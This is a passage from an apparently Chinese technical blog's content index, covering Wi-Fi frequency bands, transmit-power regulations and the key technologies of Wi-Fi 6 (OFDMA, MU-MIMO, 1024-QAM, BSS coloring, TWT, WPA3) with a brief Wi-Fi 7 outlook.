title=\"315MHz\"></a>315MHz</h3><p>北美地区很早就将315MHz纳入ISM频段，广泛地运用在车辆监控、遥控遥测、无线抄表、门禁系统、工业数据采集、安全防火系统、生物信号采集、水文气象监控、机器人控制等领域。<br>这也是国内早期无线遥控产品的主要频段，但由于这个频段的产品庞杂造成干扰严重，后期逐步转向使用433MHz频段。</p>\n<h3 id=\"433-920MHz\"><a href=\"#433-920MHz\" class=\"headerlink\" title=\"433.920MHz\"></a>433.920MHz</h3><p>频率范围为430.050～434.790MHz，属于UHF频段，电磁波遇到建筑物或其他障碍物时，将出现明显的衰减和反射。。<br>在世界范围内分配给业余无线电服务使用，该频段可用于反向散射RFID系统，除此之外，还可用于小型电话机、遥测发射器、无线耳机、近距离小功率无线对讲机、汽车无线中央闭锁装置等。</p>\n<h3 id=\"民用对讲机\"><a href=\"#民用对讲机\" class=\"headerlink\" title=\"民用对讲机\"></a>民用对讲机</h3><p>民用对讲机也采用ISM频段，但各国的规定并不统一，我国开放的频点数20个，频率范围409.750-409.9875MHZ，间隔125KHz。<br>美国则是14个频点，分462MHz和467MHz两组，每组7个频点，日本、韩国也采用美国标准。</p>\n<h2 id=\"附录二：关于发射功率的法律限制\"><a href=\"#附录二：关于发射功率的法律限制\" class=\"headerlink\" title=\"附录二：关于发射功率的法律限制\"></a>附录二：关于发射功率的法律限制</h2><p>无线路由器的功率很低，而且严格受到国家的管控，只要是符合国家标准的产品，都是安全的。<br>中国工信部对于<a href=\"https://wap.miit.gov.cn/cms_files/filemanager/1226211233/attach/20219/d125301b13454551b698ff5afa49ca28.pdf\">Wi-Fi各频段的发射功率有严格要求</a>，对路由器无线辐射的担心是不必要的。<br>无线功率的常用单位有：分贝毫瓦（dBm），毫瓦（mW）</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">EIRP（等效全向辐射功率） = 有效功率 + 天线增益 - 天线馈线线路损耗</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-4GHz频段\"><a href=\"#2-4GHz频段\" class=\"headerlink\" title=\"2.4GHz频段\"></a>2.4GHz频段</h3><p>天线增益＜10dBi时：发射功率≤100mW 或 ≤20dBm，一般是家用路由器和室内AP。<br>天线增益≥10dBi时：发射功率≤500mW 或 ≤27dBm，一般是室外AP。</p>\n<h3 id=\"5-2Ghz频段（36-64信道）\"><a href=\"#5-2Ghz频段（36-64信道）\" class=\"headerlink\" title=\"5.2Ghz频段（36~64信道）\"></a>5.2Ghz频段（36~64信道）</h3><p>中国：发射功率≤200mW 或 23dBm</p>\n<h3 id=\"5-8Ghz频段（149-165信道）\"><a href=\"#5-8Ghz频段（149-165信道）\" class=\"headerlink\" title=\"5.8Ghz频段（149~165信道）\"></a>5.8Ghz频段（149~165信道）</h3><p>发射功率≤2000+mW或33dBm，射频口发射功率 &lt;&#x3D;500mW 或 27dBm（功放组合功率）</p>\n<blockquote>\n<p>美国、澳大利亚等国家对发射功率的要求较为宽松，一般为4000mW，或36dBm，因此许多路由器可以通过修改国家属性提高覆盖范围</p>\n</blockquote>\n<h2 id=\"附录三：中国移动通信的无线频率分布\"><a href=\"#附录三：中国移动通信的无线频率分布\" class=\"headerlink\" title=\"附录三：中国移动通信的无线频率分布\"></a>附录三：中国移动通信的无线频率分布</h2><img src=\"/2022/03/27/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%80%EF%BC%9A%E9%A2%91%E7%8E%87%E8%A7%84%E5%88%92/YD.png\" class=\"\">\n<img src=\"/2022/03/27/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%80%EF%BC%9A%E9%A2%91%E7%8E%87%E8%A7%84%E5%88%92/DX.png\" class=\"\">\n<img src=\"/2022/03/27/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%80%EF%BC%9A%E9%A2%91%E7%8E%87%E8%A7%84%E5%88%92/LT.png\" class=\"\">\n<img src=\"/2022/03/27/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%80%EF%BC%9A%E9%A2%91%E7%8E%87%E8%A7%84%E5%88%92/GD.png\" class=\"\">\n\n<h2 id=\"附录四：车联网的常用频率\"><a href=\"#附录四：车联网的常用频率\" class=\"headerlink\" title=\"附录四：车联网的常用频率\"></a>附录四：车联网的常用频率</h2><img src=\"/2022/03/27/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%80%EF%BC%9A%E9%A2%91%E7%8E%87%E8%A7%84%E5%88%92/auto.png\" class=\"\">\n\n<h2 id=\"附录五：昙花一现的无线城市\"><a href=\"#附录五：昙花一现的无线城市\" class=\"headerlink\" title=\"附录五：昙花一现的无线城市\"></a>附录五：昙花一现的无线城市</h2><p>2008开始中国进入3G移动通信时代，受到通信技术标准的困扰，中国移动大力推广“无线城市”，试图采用基于802.11n的Wi-Fi技术分流移动网络流量，通过大功率CPE实现大范围的室外覆盖，曾经宣布已在全国部署300万个Wi-Fi热点并提供商用，但始终举步维艰，重要原因是：</p>\n<ul>\n<li>频率资源限制：根据通信蜂窝网的基本原则，有效覆盖至少需要3个互不干扰的40MHz信道，也就是120MHz频率。但2.4G频段只有83.5MHz，先期开发的5.8GHz只有100MHz，5.2GHz有干净的80MHz，但另外80MHz需要满足DFS的要求，始终无法提供足够的频率资源。</li>\n<li>商业模式缺失：由于IEEE 802.11是IT技术而非通信技术，其WAP2认证协议的功能非常简单，当时提出要攻克Wi-Fi认证难题，实际是希望实现基于时长或流量的收费模式，但最终无疾而终</li>\n</ul>\n<p>随着2013年4G牌照的发放，运营商放弃无线城市转而全力发展移动网络，而工信部也全面放开5GHz频段，用户也不再为那些室外CPE的频率干扰闹心了。</p>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><h3 id=\"官方网站\"><a href=\"#官方网站\" class=\"headerlink\" title=\"官方网站\"></a>官方网站</h3><ul>\n<li><a href=\"https://wap.miit.gov.cn/zwgk/zcwj/wjfb/tz/art/2021/art_e4ae71252eab42928daf0ea620976e4e.html\">工信部-关于加强和规范2400MHz、5100MHz和5800MHz频段无线电管理有关事宜的通知</a></li>\n<li><a href=\"https://www.wi-fi.org/zh-hans\">Wi-Fi Alliance的官方网站</a></li>\n</ul>\n<h3 id=\"技术评论\"><a href=\"#技术评论\" class=\"headerlink\" title=\"技术评论\"></a>技术评论</h3><ul>\n<li><a href=\"https://yuanze.wang/posts/things-about-wifi/\">Wi-Fi的那些事：无线电、速率与组网</a></li>\n<li><a href=\"https://www.eet-china.com/mp/a77283.html\">无线路由器及Wi-Fi组网指南（史上最全）</a></li>\n<li><a href=\"https://zh.wikipedia.org/wiki/%E6%97%A0%E7%BA%BF%E5%B1%80%E5%9F%9F%E7%BD%91%E4%BF%A1%E9%81%93%E5%88%97%E8%A1%A8\">无线局域网信道列表 - Wiki</a></li>\n<li><a href=\"https://www.sohu.com/a/432446555_814535\">何为ISM频段？ISM频段主要频率有哪些？</a></li>\n<li><a href=\"http://www.iwl.iiot.com/news/345.html\">射频识别RFID不同工作频段有何特点</a></li>\n<li><a href=\"http://uuspider.com/2015/01/14/01.html\">雷达的工作频率</a></li>\n</ul>\n<h3 id=\"资料下载\"><a href=\"#资料下载\" class=\"headerlink\" title=\"资料下载\"></a>资料下载</h3><ul>\n<li><a href=\"WLAN%E9%A2%91%E6%AE%B5%E4%BB%8B%E7%BB%8D.pdf\">WLAN频段介绍.pdf</a></li>\n<li><a href=\"Intel%E5%85%B3%E4%BA%8EUSB3.0%E6%97%A0%E7%BA%BF%E5%B9%B2%E6%89%B0%E7%9A%84%E7%99%BD%E7%9A%AE%E4%B9%A6.pdf\">Intel关于USB 3.0频率干扰的技术白皮书</a></li>\n<li><a href=\"%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%92%8C%E7%89%A9%E8%81%94%E7%BD%91%E6%97%A0%E7%BA%BF%E7%94%B5%E9%A2%91%E7%8E%87%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97-2021.pdf\">工业互联网和物联网无线电频率使用指南（2021年版）</a></li>\n<li><a href=\"00016c58d7ef1d09ab3538.pdf\">车联网发展、法律法规和测试研究</a></li>\n</ul>\n"},{"title":"Wi-Fi 6的技术专题之三：关键技术","url":"/2022/03/29/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%89%EF%BC%9A%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF/","content":"<p>从理论上看，Wi-Fi的理论速率与以下因素密切相关：频宽、频率复用技术、调制方法、编码方案和天线数量等，可以表示为下面的公式：</p>\n<img src=\"/2022/03/29/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%89%EF%BC%9A%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF/rate.png\" class=\"\">\n\n<p>回顾整个 802.11 协议标准的发展历程，每一代新的协议都在与3GPP的移动通信技术相互借鉴，传输速率和数据吞吐率方面有着较大的提升，尤其是演进到 802.11ac 协议后，无线网络带宽与有线差距越来越小，基本可以满足大部分应用的需求。但802.11ac 的最大速率6.9Gbps只是实验室环境的理论值，在实际应用场景的有效带宽远远低于理论值，且并发用户数越多，有效吞吐率就会越差。</p>\n<p>802.11ax 的关键字是高效率无线标准（HEW，High-Efficiency Wireless），任务目标是：</p>\n<ul>\n<li>进一步提高理论最大速率，从 802.11ac 的6.9Gbps提高到 9.6Gbps；</li>\n<li>更重要的是，大幅度提高多用户并发效率，提供密集用户环境下4倍实际吞吐量的提升</li>\n<li>以及，更好适应物联网等室外场景的应用。</li>\n</ul>\n<p>从技术栈的角度看，Wi-Fi 6主要采用了以下优化技术，分别工作在PHY物理层和MAC链路层。</p>\n<img src=\"/2022/03/29/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%89%EF%BC%9A%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF/arch.png\" class=\"\">\n\n<h2 id=\"一、OFDMA-多用户的-OFDM\"><a href=\"#一、OFDMA-多用户的-OFDM\" class=\"headerlink\" title=\"一、OFDMA &#x3D; 多用户的 OFDM\"></a>一、OFDMA &#x3D; 多用户的 OFDM</h2><p>从 802.11a 开始直到 802.11ac，数据传输一直采用OFDM（正交频分复用）模式，单一信道被分成了多个子载波，每一个子载波是正交的，通过快速傅里叶变换（FFT）和快速傅里叶逆变换（IFFT）来构成的，不会互相干扰。<br>但是，在OFDM模式下，不同用户是通过不同时间片段区分出来的，因此对于每一个时间片段，一个用户完整占据所有的子载波并发送一个完整的数据包，因此如果某个用户发送的数据不多，频率资源用不满的情况下，其他用户只能干巴巴地排队等着，频谱资源的使用效率不高。</p>\n<img src=\"/2022/03/29/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%89%EF%BC%9A%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF/ofdm.png\" class=\"\">\n\n<p>为了解决这个问题，802.11ax 引入了OFDMA（正交频分复用多址）技术，后面多了个字母A代表多址，就是多用户复用的意思，也就是OFDM的多用户版本。</p>\n<blockquote>\n<p>实际上，OFDMA技术来自于3GPP LTE，802.11ax就是简单抄袭过来的</p>\n</blockquote>\n<p>具体实现方式是利用 OFDM 对信道进行父载波化，将同一个带宽下的所有子载波划分成若干个子载波组，每一个组被称作一个 RU（Resouce Unit，资源单元），可以同时分配给不同的用户使用，每一个时间片上可有多个用户同时发送，这样就提高了用户数据速率并减少了延迟，特别适用于大量具有短帧或低速率要求的设备，如物联网设备。<br>在 OFDMA 中，一个 OFDM 信号是由多个子载波组成，这些子载波就组成了一个用户自己的带宽，每个用户可分配的 RU 大小可以是不同的。</p>\n<img src=\"/2022/03/29/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%89%EF%BC%9A%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF/ofdma.png\" class=\"\">\n\n<p>与传统OFDM相比，OFDMA并不能显著提升单用户速率，但对于多用户并发将带来明显的优势：</p>\n<ul>\n<li>更稳定的传输效率：在部分节点信道状态不太好的情况下，可以根据信道质量分配发送功率，来更精细化的分配信道时频资源</li>\n<li>更短的传输延迟：因为 802.11ac 及之前的标准都是占据整个信道传输数据的，如果有一个 QOS 数据包需要发送，其一定要等之前的发送者释放完整个信道才行，所以会存在较长的时延。在OFDMA 模式下，由于一个发送者只占据整个信道的部分资源，一次可以发送多个用户的数据，所以能够减少 QOS 节点接入的时延</li>\n<li>更高的用户并发度：OFDMA将整个信道资源划分成多个子载波，子载波又按不同 RU 类型被分成若干组，每个用户可以占用一组或多组 RU 以满足不同带宽需求的业务</li>\n</ul>\n<h2 id=\"二、DL-MU-MIMO-UL-MU-MIMO\"><a href=\"#二、DL-MU-MIMO-UL-MU-MIMO\" class=\"headerlink\" title=\"二、DL MU-MIMO + UL MU-MIMO\"></a>二、DL MU-MIMO + UL MU-MIMO</h2><p>路由器上面的天线数量是越来越多，现在不管啥价钱的路由器，都长得跟螃蟹似的，张牙舞爪好不唬人。为啥要用这么多天线？就是为了更好地实现MIMO（多输入多输出）技术。简单来说，就是在信号发射时，用多根天线来同时发送多路不同的数据，速度自然成倍提升；在接收时，多个天线同时接收手机发来的信号，跟戴了助听器一样，接收灵敏度也得到了增强。</p>\n<p>在传统的SU-MIMO中，若具有多条空间流的路由器下同时连接了多个只支持单个空间流的设备，在它们同时下载时，路由器只能使用一条空间流轮流与这些设备通信，剩下的空间流均会被浪费。</p>\n<h3 id=\"下行-MU-MIMO\"><a href=\"#下行-MU-MIMO\" class=\"headerlink\" title=\"下行 MU-MIMO\"></a>下行 MU-MIMO</h3><p>2016年推出的802.11ac wave2中，增加了MU-MIMO（Multi-User MIMO）的支持（仅下行方向），AP可以使用不同的空间流（天线）与不同的设备进行通信，从而带来多路复用增益，实现了对多用户下行并发场景性能的提升。</p>\n<blockquote>\n<p>MU-MIMO技术在制定之时，最多只允许3条流同时传输，如今更多手机均使用2x2MIMO，但两台这样的手机是无法激活MU-MIMO的。<br>而且，MU-MIMO仅会在多台均支持MU-MIMO的设备同时吞吐时才会生效，若无线网络中支持MU-MIMO的终端设备较少，其效果将会非常有限。</p>\n</blockquote>\n<img src=\"/2022/03/29/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%89%EF%BC%9A%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF/DL-MIMO.png\" class=\"\">\n\n<p>802.11ac 只支持DL 4x4 MU-MIMO（下行），在802.11ax中进一步增加了MU-MIMO数量，可支持DL 8x8 MU-MIMO，同时借助DL OFDMA技术（下行），可同时进行MU-MIMO传输和分配不同RU进行多用户多址传输，既增加了系统并发接入量，又均衡了吞吐量。<br>在信道评估阶段，802.11ax 使用 OFDMA 机制中的 trigger 方式来完成 AP 收集各 STA 的信道 CBF（Compressed Beamforming Feedback，压缩波束成形反馈信息）信息，进行信道质量评估。</p>\n<h3 id=\"上行-MU-MIMO\"><a href=\"#上行-MU-MIMO\" class=\"headerlink\" title=\"上行 MU-MIMO\"></a>上行 MU-MIMO</h3><p>UL MU-MIMO（上行）是802.11ax中引入的一个重要特性，UL MU-MIMO的概念和UL SU-MIMO的概念类似，都是通过发射机和接收机多天线技术使用相同的信道资源在多个空间流上同时传输数据，唯一的差别点在于UL MU-MIMO的多个数据流是来自多个用户。</p>\n<img src=\"/2022/03/29/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%89%EF%BC%9A%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF/UL-MIMO.png\" class=\"\">\n\n<p>802.11ac及之前的802.11标准都是UL SU-MIMO，即只能接受一个用户发来的数据，多用户并发场景效率较低，802.11ax支持UL MU-MIMO后，借助UL OFDMA技术（上行），可同时进行MU-MIMO传输和分配不同RU进行多用户多址传输，提升多用户并发场景效率，大大降低了应用时延。</p>\n<h2 id=\"三、更高密度的子载波\"><a href=\"#三、更高密度的子载波\" class=\"headerlink\" title=\"三、更高密度的子载波\"></a>三、更高密度的子载波</h2><p>载波类似于频域上的 Symbol，一个子载波承载一个 Symbol。<br>在Wi-Fi 5及以前（802.11a&#x2F;b&#x2F;g&#x2F;n&#x2F;ac），子载波宽度是312.5KHz。以HT20（20MHz带宽）为例，其被划分为64个子载波，其中52个用于承载数据，4个用于导频，8个作为保护频带。</p>\n<img src=\"/2022/03/29/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%89%EF%BC%9A%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF/subcarrier.png\" class=\"\">\n\n<h3 id=\"时域帧格式\"><a href=\"#时域帧格式\" class=\"headerlink\" title=\"时域帧格式\"></a>时域帧格式</h3><p>802.11ax根据不同的用途，时域可以分为4种帧格式。这四种HE PPDU（Presentation Protocol Data Unit，表示协议数据单元）包括HE SU-PPDU（单用户）、HE MU-PPDU（多用户）、HE Extended Range SU-PPDU（扩展的单用户协议）以及基于Trigger的HE PPDU。<br>高效的前导则包含HE-SIG-A、HE-SIG-B（可选）、HE-STF和HE-LTF。其中HE-LTF主要是用来做信道估计和MIMO检测。</p>\n<h3 id=\"频域资源单位RU\"><a href=\"#频域资源单位RU\" class=\"headerlink\" title=\"频域资源单位RU\"></a>频域资源单位RU</h3><p>对于802.11ax，子载波密度提高了4倍，包含256个子载波，其宽度也缩小为78.125KHz，并基于 OFDMA 模式以 RU 为单位分配频率资源，最小RU为包含26个子载波的2MHz带宽，此外还有52、106、242、484或996数量的子载波。</p>\n<p>下图是20MHz和40MHz带宽的 RU 帧结构图，以最常见的第一行为例，总共256个子载波中，有效子载波为234个（9个包含26个子载波的RU），此外还有首尾11个保护载波 、4个导频载波、7个中央直流载波。</p>\n<img src=\"/2022/03/29/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%89%EF%BC%9A%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF/ru.jpeg\" class=\"\">\n\n<blockquote>\n<p>蓝色部分是有效子载波，其它颜色是导频（橙黄色）、直流（DC）和保护子载波（edge）<br>除了信道中央位置的直流载波，资源单位是相邻和连续的</p>\n</blockquote>\n<h2 id=\"四、更高效率的调制编码策略\"><a href=\"#四、更高效率的调制编码策略\" class=\"headerlink\" title=\"四、更高效率的调制编码策略\"></a>四、更高效率的调制编码策略</h2><p>调制编码，分为调制和编码两部分，它们共同决定了单位时间可以同时发送的比特数。其中：</p>\n<ul>\n<li>调制方式：规定每次能够同时发送的比特数，例如BPSK、QPSK、16QAM，64QAM和256QAM</li>\n<li>码率：有用的数据在编码后总数据量中的占比。如果码率是3&#x2F;4，就是指编码后的数据中，3位数据比特 + 1位冗余比特。</li>\n</ul>\n<p>我们一般将调制和编码两部分组合起来分为多个等级，级别越高，数据发送的速率也就越快，这就是调制编码策略 MCS（Modulation Coding Scheme）。<br>802.11ac的基础MSC如下表：</p>\n<img src=\"/2022/03/29/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%89%EF%BC%9A%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF/ac-msc.png\" class=\"\">\n\n<p>802.11ac的常见速率 867Mbps &#x3D; 433.3 Mbps * 2，此时采用 2*2 MIMO，工作在MSC 9模式（80MHz传输带宽、256-QAM调制模式、0.4us保护间隔、5&#x2F;6的编码方式）。</p>\n<p>802.11ax的基础MSC如下表：</p>\n<img src=\"/2022/03/29/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%89%EF%BC%9A%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF/ax-msc.png\" class=\"\">\n\n<p>上表是基于单流的数据，MIMO速率就是直接乘上通道数量。<br>802.11ax的理论最大速率 9.6Gbps &#x3D; 1201 Mbps * 8，此时采用 8*8 MIMO，工作在MSC 11模式（160MHz传输带宽、1024-QAM调制模式、0.8us保护间隔、5&#x2F;6的编码方式）。</p>\n<h3 id=\"256QAM-–-1024QAM\"><a href=\"#256QAM-–-1024QAM\" class=\"headerlink\" title=\"256QAM –&gt; 1024QAM\"></a>256QAM –&gt; 1024QAM</h3><p>常用的调制方式包括BPSK、QPSK、16QAM，64QAM和256QAM，能同时发送的比特数为1个，2个，4个，6个和8个。<br>802.11ac 协议采用最高 256-QAM 正交幅度调制，即每个符号可以传输 8bit 数据。</p>\n<img src=\"/2022/03/29/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%89%EF%BC%9A%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF/QAM.png\" class=\"\">\n\n<p>802.11ax 协议采用最高 1024-QAM 正交幅度调制，即每个符号可以传输 10bit 数据，10bit&#x2F;8bit&#x3D;1.25，因此相对于 802.11ac 来说，802.11ax 的速率会提升 25%。</p>\n<blockquote>\n<p>高通已提供4096-QAM，理论速率提高20%，也称为MCS12~MCS13，但最大仅支持2*2 MIMO，同时终端支持也非常有限</p>\n</blockquote>\n<h3 id=\"更长的-Symbol-时长-更短的-GI-间隔\"><a href=\"#更长的-Symbol-时长-更短的-GI-间隔\" class=\"headerlink\" title=\"更长的 Symbol 时长 + 更短的 GI 间隔\"></a>更长的 Symbol 时长 + 更短的 GI 间隔</h3><p>Symbol就是时域上的传输信号，相邻的两个Symbol之间需要有一定的空隙（GI），以避免Symbol之间的干扰。就像中国的高铁一样，每列车相当于一个Symbol，同一个车站发出的两列车之间一定要有一个时间间隙，否则两列车就可能会发生碰撞。不同Wi-Fi标准下的间隙也有不同，一般来说传输速率较快时GI需要适当增大，就像同一车道上两列350KM&#x2F;h时速的高铁发车时间间隙要比时速250KM&#x2F;h时速的高铁发车间隙要大一些。</p>\n<p>对于 802.11ac，Symbol的有效传输时长为3.2us，GI 有0.4us 和 0.8us 的两种模式。<br>对于 802.11ax 由于子载波密度提高了4倍，Symbol的有效传输时长提高到 3.2 * 4 &#x3D; 12.8us，GI 提高到 0.8us 和 1.6us。换句话说，Wi-Fi 6 的传输容量提高了4倍，但信号间隔只提高了2倍，因此传输效率又了显著提升。</p>\n<p>在 GI 同为 800ns 的情况下，对于 802.11ac来说：<br>    每个 Symbol 的传输时间为(3.2+0.8)&#x3D;4.0us，有效数据传输时间占比为 3.2&#x2F;4.0&#x3D;0.8，<br>而对于 802.11ax 来说：<br>    每个 Symbol 的传输时间为(12.8+0.8)&#x3D;13.6us，有效数据传输时间占比为 12.8&#x2F;13.6&#x3D;0.94。</p>\n<h2 id=\"五、BSS-Coloring-着色机制\"><a href=\"#五、BSS-Coloring-着色机制\" class=\"headerlink\" title=\"五、BSS Coloring - 着色机制\"></a>五、BSS Coloring - 着色机制</h2><p>Wi-Fi射频的传输原理是在任何指定时间内，一个信道上只允许一个用户传输数据，如果Wi-Fi AP和客户端在同一信道上侦听到有其他802.11无线电传输，则会自动进行冲突避免，推迟传输，因此每个用户都必须轮流使用（这就是CSMA&#x2F;CA的原理）。<br>802.11ac及之前的标准，通常采用动态调整CCA门限的机制来改善同频信道间的干扰，通过识别同频干扰强度，动态调整CCA门限，忽略同频弱干扰信号实现同频并发传输，提升系统吞吐容量。</p>\n<p>Spatial Reuse（空间复用），也被称作“BSS着色”（BSS coloring），通过此技术可以实现更多同步传输，即AP可以识别两个相距不远但并不相邻的AP和终端设备，能够在同一时间内实现无线并发传输而不会相互影响。用于解决不同AP在相同信道下并发冲突的问题。</p>\n<blockquote>\n<p>BSS着色技术来源于 802.11ah，由于其应用的室外场景往往多个AP同时工作，利用BSS染色技术可以快速检测网络环境以减少干扰</p>\n</blockquote>\n<img src=\"/2022/03/29/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%89%EF%BC%9A%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF/obss.jpeg\" class=\"\">\n\n<ul>\n<li>当路由器或设备在发送数据前侦听到信道已被占用时，会首先检查该“占用”的BSS Color（<strong>此处可以看出 BSS Color 是要优先于 MAC address判断的</strong>），确定是否是同一AP的网络，如果不是，则不用避让，从而允许多个AP在同一信道上运行，并智能管理多用户同时并行传输</li>\n<li>采用BSS着色机制，接收端可以及早识别同频传输干扰信号并停止接收，避免浪费收发机时间。如果颜色相同，则认为是同一BSS内的干扰信号，发送将推迟；如果颜色不同，则认为两者之间无干扰，两个Wi-Fi设备可同信道同频并行传输。</li>\n</ul>\n<h2 id=\"六、TWT-目标唤醒时间\"><a href=\"#六、TWT-目标唤醒时间\" class=\"headerlink\" title=\"六、TWT - 目标唤醒时间\"></a>六、TWT - 目标唤醒时间</h2><p>目标唤醒时间（TWT）是802.11ax支持的另一个重要的资源调度功能，它借鉴于<strong>802.11ah</strong>标准。它允许设备协商什么时候和多久会被唤醒，然后发送或接收数据。<br>此外，Wi-Fi AP可以将客户端设备分组到不同的TWT周期，从而减少唤醒后同时竞争无线介质的设备数量。TWT还增加了设备睡眠时间，对采用电池供电的终端来说，大大提高了电池寿命。</p>\n<h2 id=\"七、新的安全标准WPA3\"><a href=\"#七、新的安全标准WPA3\" class=\"headerlink\" title=\"七、新的安全标准WPA3\"></a>七、新的安全标准WPA3</h2><p>面前主流的Wi-Fi安全标准WEP2已经发布20多年了（之前更古老的是WPA和WEP，以及未流行的WAPI），存在许多明显的安全隐患，为此Wi-Fi联盟发布了新的安全标准WPA3，主要特性是：</p>\n<ul>\n<li>建立了 Wi-Fi设备配置协议（DPP），WPA3不需要使用共享密码即可注册新设备，从而摆脱了对屏幕和键盘输入的依赖，特别适用于智能灯泡等物联网设备。实现方式是用户使用二维码或NFC标签，通过拍摄照片或接收来自于路由器的无线电信号，以传输系统访问权限的方式获得相应的网络授权，而非通过屏幕输入密码。</li>\n<li>提供“个性化数据加密”功能，当您连接到开放的Wi-Fi网络时，即使您在连接时未输入密码，设备与Wi-Fi接入点之间的流量也会被加密</li>\n<li>字典攻击不再可用，因为WPA 3安全协议会限制错误密码次数，从而击败基于字典爆破的尝试</li>\n<li>加密强度升到了192位（CNSA标准）</li>\n<li>修正了KRACK（重装密钥攻击）问题</li>\n</ul>\n<p>由于WPA3的实现需要AP和终端设备的共同改造，目前还没有实现大规模的商业普及！</p>\n<h2 id=\"八、小结\"><a href=\"#八、小结\" class=\"headerlink\" title=\"八、小结\"></a>八、小结</h2><img src=\"/2022/03/29/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%89%EF%BC%9A%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF/phy.png\" class=\"\">\n\n<h2 id=\"九、展望-Wi-Fi-7\"><a href=\"#九、展望-Wi-Fi-7\" class=\"headerlink\" title=\"九、展望 Wi-Fi 7\"></a>九、展望 Wi-Fi 7</h2><p>IEEE 802.11be是计划中802.11 IEEE标准的下一个版本，将会命名为Wi-Fi 7，预计2024年发布。</p>\n<p>候选特性：</p>\n<ul>\n<li><strong>支持全新的6GHz频谱</strong>，并适配相应的监管法规</li>\n<li>支持320MHz的信道宽度，高效地利用充裕的频谱</li>\n<li>支持16个空间流，多输入多输出 (MIMO) 协议改进</li>\n<li>支持全新的 4096-QAM (4K-QAM)</li>\n<li>新的帧格式，改进的前向兼容</li>\n<li>多带宽／多信道聚合运作，对拥塞和频谱和充裕的频谱分别引入 320&#x2F;160+160 MHz 和 240&#x2F;160+80 MHz 带宽，</li>\n<li>接入点 (AP) 间协调（传输协调与联合传输）</li>\n<li>更高级的链路适应和重新传输协议，例如混合自动重请求 (HARQ)</li>\n<li>集成时效性网络 (TSN) 扩展，应对低时延实时流量 (IEEE 802.11aa)</li>\n<li>改进正交频分多址的资源分配</li>\n<li>改进信道探测，降低探测时间，隐式信道探测，更灵活的 preamble puncturing 方法</li>\n<li>对直接链路的支持，由接入点主导</li>\n</ul>\n<h2 id=\"附录：名词解释\"><a href=\"#附录：名词解释\" class=\"headerlink\" title=\"附录：名词解释\"></a>附录：名词解释</h2><table>\n<thead>\n<tr>\n<th>缩略语</th>\n<th>英文全名</th>\n<th>中文解释</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>OFDMA</td>\n<td>Orthogonal Frequency Division Multiple Access</td>\n<td>正交频分多址接入</td>\n</tr>\n<tr>\n<td>HE</td>\n<td>Hight Efficiency</td>\n<td>高效率</td>\n</tr>\n<tr>\n<td>PPDU</td>\n<td>physical layer (PHY) protocol data unit</td>\n<td>物理层协议数据单元</td>\n</tr>\n<tr>\n<td>RU</td>\n<td>Resource Unit</td>\n<td>资源单元</td>\n</tr>\n<tr>\n<td>OBSS</td>\n<td>Overlapping Basic Service Sets</td>\n<td>重叠基本服务集</td>\n</tr>\n<tr>\n<td>SR</td>\n<td>Spatial 